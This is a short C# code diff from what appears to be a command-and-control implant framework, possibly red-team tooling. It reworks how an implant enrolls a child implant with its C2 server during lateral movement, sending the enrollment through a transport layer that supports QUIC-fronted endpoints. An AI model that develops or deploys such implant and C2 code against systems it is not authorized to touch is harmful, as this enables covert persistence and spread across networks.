@@ -61,9 +61,17 @@ internal static class Lateral
             // resolves and scope-checks the parent before recording the linkage
             // (architecture.md Sec 10.1). The child reports this machine's host
             // facts: the enroll happens in this implant's process, so the child's
-            // device identity is the host it was derived on.
-            var enrolled = await C2.EnrollAsync(
-                enroll.Url, token, enroll.ParentId, childKey, enroll.CAs, enroll.Profile, requestedClass, HostIdentity.Capture());
+            // device identity is the host it was derived on. The dial goes
+            // through the transport selection's enroll dispatch, so a
+            // quic-schemed bundle URL (the walk's current entry is a quic front)
+            // runs the QUIC frame exchange; its connection closes here -- the
+            // child holds no session in this process.
+            var dial = new EnrollDial(
+                enroll.Url, token, enroll.ParentId, childKey, enroll.CAs, enroll.Profile,
+                requestedClass, HostIdentity.Capture());
+            var enrolled = await TransportSelection.EnrollAsync(dial);
+            if (dial.OpenedConnection is { } childWire)
+                await childWire.DisposeAsync();
             // A Pivot-class child has no process of its own (architecture.md
             // Sec 5.2): its tasking will arrive on this implant's stream marked
             // with the child's id, and the fronting gate accepts only children
